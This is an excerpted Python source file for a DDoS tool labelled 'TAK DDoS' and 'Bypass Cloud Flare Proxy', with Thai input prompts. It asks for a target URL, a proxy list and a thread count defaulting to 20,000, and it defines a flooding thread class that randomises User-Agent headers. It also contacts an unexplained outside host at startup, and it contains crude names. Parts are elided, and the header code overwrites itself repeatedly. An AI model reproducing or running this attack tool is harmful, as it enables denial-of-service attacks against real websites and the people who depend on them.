...
import requests
os.system("title Bypass Cloud Flare Proxy ! #KRITT KORN")
r = requests.get('https://kritsada.space/pussy.php')
useragents = [
...
class fucker(threading.Thread):
    ...
    def __init__(self, url, number, proxy):
        ...
        self.headers = { 'User-Agent' : random.choice(acceptall) }
        self.headers = { 'User-Agent' : random.choice(ref) }
        self.headers = { 'User-Agent' : random.choice(nurls) }
        self.headers = { 'User-Agent' : random.choice(burls) }
...
class MainLoop():
    ...
    def home(self):
        global Close, Request, Tot_req
        os.system("clear")
        os.system("figlet TAK DDoS")
        os.system("neofetch")
        print ("upgrad By: Tak")
        print ("FB: Shadow'w Tak'k")
        time.sleep(2)
        os.system("clear")
        try:
            url = input('ใส่URL: ')
        ...
        try:
            ...
            file_proxy = str(input('ใส่ proxy.txt : '))
            in_file = open(file_proxy,"r")
        num_threads = str(input('Thread (20000): '))
        if num_threads == "":
            num_threads = int(20000)
            print("Thread : ")
        else:
